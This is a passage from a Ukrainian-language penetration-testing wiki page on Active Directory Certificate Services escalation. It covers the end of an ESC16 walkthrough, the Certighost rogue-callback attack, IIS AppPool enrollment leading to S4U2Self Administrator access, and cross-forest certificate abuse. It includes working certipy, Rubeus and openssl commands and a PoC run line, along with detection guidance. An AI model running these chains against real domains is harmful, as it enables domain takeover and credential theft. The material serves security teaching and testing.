    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Крок 4: Запросіть сертифікат як користувач «жертва» за шаблоном автентифікації клієнта, на який обліковий запис може подати запит (наприклад, «User»), на CA, налаштованому через ESC16.** CA не додає до виданого сертифіката розширення безпеки SID, але саме по собі це не забезпечує придатного для використання зіставлення автентифікації. Задайте змінну середовища кешу облікових даних Kerberos (команда оболонки):

```bash
export KRB5CCNAME=victim.ccache
```

Потім запросіть сертифікат:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Крок 5: Відновіть UPN облікового запису «жертви».**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Крок 6: На застарілому KDC або KDC у режимі сумісності, який приймає це слабке зіставлення, пройдіть автентифікацію як цільовий адміністратор.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Підміна ідентичності через rogue LDAP/LSA chase callback (Certighost / CVE-2026-54121)

### Пояснення

**Certighost** використовує **шлях enrollment chase / callback в AD CS**, де CA довіряє атрибутам запиту, наданим запитувачем, щоб визначити ідентичність, яку слід зазначити у виданому сертифікаті. У публічному PoC сформований запит містить:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: контрольований атакувальником хост/IP, до якого під’єднається CA
- **`rmd`**: **DNS-ім’я цільового Domain Controller**, який потрібно видати за інший

Якщо CA виконає цей chase, він під’єднається до атакувальника через **SMB/LSA (`445`)** і **LDAP (`389`)**. Атакувальник використовує **реальний обліковий запис комп’ютера** (зазвичай створений завдяки типовому значенню **`ms-DS-MachineAccountQuota`**), щоб сесія callback автентифікувалася як дійсний доменний принципал. Але rogue-сервіси повертають натомість атрибути ідентичності **цільового DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Якщо CA **криптографічно не прив’язує повернуту ідентичність до автентифікованого принципала callback**, він може видати сертифікат для **Domain Controller**, хоча сесія автентифікувалася як контрольований атакувальником обліковий запис комп’ютера. Концептуально ця вразливість відрізняється від **Certifried**: замість зміни атрибутів AD, як-от `dNSHostName`, атакувальник **підмінює дані ідентичності під час визначення ідентичності через callback CA**.<sup>[[2]](#references)</sup>

**Корисні передумови:**

- Облікові дані домену з **низькими привілеями**
- Можливість **створити або повторно використати обліковий запис комп’ютера**
- Мережева доступність для **CA** до контрольованих атакувальником **портів `389` і `445`**
- Вразливий / неоновлений шлях обробки запитів CA (оновлення Microsoft від **14 липня 2026 року** додало **перевірку DC для `cdc`** і **порівняння визначених SID**)

Отриманий **`.pfx`** можна використати для **PKINIT**, отримавши **`.ccache`** і, у сценарії опублікованого PoC, **NT-хеш цільового DC**, якого зазвичай достатньо для **повної компрометації домену**.

### Експлуатація

Публічний PoC автоматизує весь ланцюжок:<sup>[[1]](#references)</sup>

1. Створити або повторно використати контрольований атакувальником **обліковий запис комп’ютера**.
2. Запустити **rogue LDAP- і SMB/LSA-слухачі** на портах `389` і `445`.
3. Надіслати запит на сертифікат з контрольованими атакувальником атрибутами **`cdc`** і цільовим **`rmd`**.
4. Дозволити CA автентифікуватися на rogue-слухачах як контрольований обліковий запис комп’ютера, але повертати у відповідь на запити ідентичності атрибути **цільового DC**.
5. Отримати підписаний CA **сертифікат DC**, а потім використати його для **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Корисні runtime-прапорці PoC:

- `--listener <ip>`: явно вибрати callback IP, який оголошується в `cdc`
- `--computer-name <NAME$>`: повторно використати наявний обліковий запис комп’ютера замість створення нового

**Операційні примітки:**

- Для PoC потрібен **root**, оскільки він прив’язується до **привілейованих портів** `389` і `445`.
- У разі успішної експлуатації локально зберігаються **DC `.pfx`** і **Kerberos `.ccache`**.
- Оскільки сертифікат прив’язаний до **облікового запису контролера домену**, подальші дії можуть включати **Kerberos-автентифікацію на основі сертифіката**, **DCSync** і повторне використання отриманого **NT-хешу комп’ютера**.<sup>[[2]](#references)</sup>

## Зарахування IIS AppPool для отримання прав Administrator на тому самому хості

Пул IIS, запущений від імені `ApplicationPoolIdentity`, використовує **обліковий запис комп’ютера** свого хоста для вихідного доступу до мережевих ресурсів. Тому виконання коду від імені `IIS AppPool\<POOL>` залишається малопривілейованим у локальному токені, але може надіслати запит до AD CS, який CA автентифікує як `HOST$`; це перехід вихідної ідентичності, а не імперсонація токена чи локальне підвищення привілеїв у стилі Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Для цього ланцюжка потрібні приєднаний до домену хост IIS, Enterprise CA, доступний через RPC, опублікований шаблон автентифікації комп’ютера, для якого комп’ютер має права на зарахування, підтримка PKINIT, а також доступність KDC/SMB. Власна ідентичність пулу змінює вихідний принципал, тому перш ніж припускати, що це `HOST$`, переконайтеся, що пул справді використовує `ApplicationPoolIdentity`.<sup>[[19]](#references)[[20]](#references)</sup>

### Зарахування з ключем під контролем зловмисника

Згенеруйте пару ключів і CSR не на сервері IIS та збережіть приватний ключ. Надішліть із скомпрометованого worker **лише CSR**. [ASPX PoC Certi-Bhai](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) створює екземпляр `CertificateAuthority.Request`, задає `CertificateTemplate:Machine`, викликає `ICertRequest::Submit` і повертає виданий сертифікат. Використовуйте рядок конфігурації CA `CAHOST\CA-NAME`; звичайний шаблон `Machine` формує subject з AD, тож дані subject/SAN, надані запитувачем, не потрібні.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Об’єднайте отриманий сертифікат із **відповідним збереженим ключем**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` спрацює лише тоді, коли Windows уже може пов’язати сертифікат із доступним приватним ключем; для окремих PEM-файлів явно створіть PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Використайте PFX для PKINIT і збережіть отриманий TGT комп’ютера у форматі base64, замість того щоб одразу його інжектувати:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self плюс підміна служби на тому самому хості

S4U2Self дає змогу службі отримати квиток **до себе**, що містить дані авторизації іншого користувача. Маючи TGT комп’ютера, Rubeus може запросити такий квиток для привілейованого користувача, переписати ім’я служби у повернутому KRB-CRED на CIFS і впровадити його. Це локальний примітив «делегування самому собі»: для нього не потрібні S4U2Proxy чи запис `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Підмінений ticket можна використовувати лише для служб на **тому самому комп’ютерному обліковому записі/ключі** (тут — CIFS на `HOST`). Це не повторно використовуваний ticket Administrator для інших комп’ютерів домену. Крім того, продемонстрований результат — привілейований доступ до SMB/файлової системи як Administrator; для отримання локального процесу `NT AUTHORITY\SYSTEM` потрібен окремий крок віддаленого виконання.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Виявлення та посилення захисту

- На CA зіставляйте події Certification Services **4886** (отримано запит) і **4887** (видано сертифікат), щоб виявляти неочікувані запити за шаблоном `Machine` від облікових записів серверів IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- На DC подія **4768** містить поля сертифіката, коли використовується certificate pre-authentication; налаштуйте оповіщення про незвичні запити PKINIT TGT для облікових записів вебсерверів. Далі перевіряйте запити **4769**, що стосуються привілейованої ідентичності, від імені якої виконується імперсонація, та того самого хоста. Оскільки Rubeus змінює ім’я служби KRB-CRED на боці клієнта за допомогою `/altservice`, не вимагайте, щоб ім’я служби в події 4769 на DC було `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Шукайте випадки, коли `w3wp.exe` звертається до кінцевих точок CA RPC, неочікуване створення ASPX, доступ із Kerberos-аутентифікацією до адміністративних спільних ресурсів і активність зі зливання секретів. За можливості обмежте доступ із рівня застосунків до CA RPC/KDC/SMB та скасуйте права на реєстрацію комп’ютерів або шаблони автентифікації комп’ютерів, які не потрібні для роботи.<sup>[[19]](#references)</sup>

## Компрометація лісів за допомогою сертифікатів: пояснення в пасивному стані

### Порушення довіри між лісами через компрометацію CA

Налаштування **реєстрації між лісами** зроблено відносно простим. Адміністратори **публікують сертифікат кореневого CA** з лісу ресурсів **у лісах облікових записів**, а сертифікати **корпоративного CA** з лісу ресурсів **додають до контейнерів `NTAuthCertificates` та AIA у кожному лісі облікових записів**. Іншими словами, така конфігурація надає **CA в лісі ресурсів повний контроль** над усіма іншими лісами, для яких він керує PKI. Якщо цей CA буде **скомпрометовано зловмисниками**, вони зможуть **підробити** сертифікати для всіх користувачів як у лісі ресурсів, так і в лісах облікових записів, порушивши таким чином межу безпеки лісу.<sup>[[6]](#references)</sup>

### Надання прав на реєстрацію зовнішнім принципалам безпеки

У середовищах із кількома лісами потрібно з обережністю ставитися до корпоративних CA, які **публікують шаблони сертифікатів**, що надають **Authenticated Users або зовнішнім принципалам безпеки** (користувачам/групам поза межами лісу, до якого належить корпоративний CA) **права на реєстрацію та редагування**.\
Під час автентифікації через довірчі відносини AD додає **SID Authenticated Users** до токена користувача. Тому, якщо в домені є корпоративний CA із шаблоном, який **надає Authenticated Users права на реєстрацію**, користувач з іншого лісу потенційно може **зареєструватися за цим шаблоном**. Так само, якщо шаблон **явно надає права на реєстрацію зовнішньому принципалу безпеки**, створюється **міжлісовий зв’язок контролю доступу**, що дає принципалу безпеки з одного лісу змогу **зареєструватися за шаблоном з іншого лісу**.

Обидва сценарії призводять до **розширення поверхні атаки** між лісами. Зловмисник може скористатися налаштуваннями шаблону сертифіката, щоб отримати додаткові привілеї в зовнішньому домені.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 — репозиторій PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n — технічний аналіз Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 — блог SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps — Certified Pre-Owned: зловживання Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak — Certipy 4.0: ESC9, ESC10, інтерфейс BloodHound, нові методи автентифікації та запитів і не тільки](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps — Shadow Credentials: зловживання зіставленням облікових записів за допомогою Key Trust для захоплення облікового запису](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy — історія про Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security — ретрансляція до AD Certificate Services через RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo — ESC12: доступ до оболонки ADCS CA через YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps — техніка зловживання ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps — техніка зловживання ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki — підвищення привілеїв (ESC1–ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec — EKUwu: не просто ще один AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 — AD CS ESC16: неправильне налаштування та експлуатація](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark — повторний розгляд «Delegate 2 Thyself»](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai — PoC реєстрації в IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux — підвищення привілеїв з IIS AppPool через кінцеву точку AD CS RPC](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft — ідентичності пулів застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft — ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications — S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL — команда pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft — аудит Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft — подія 4768: запит на отримання квитка автентифікації Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft — подія 4769: запит на отримання квитка служби Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai — набір інструментів експлуатації AD CS для PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
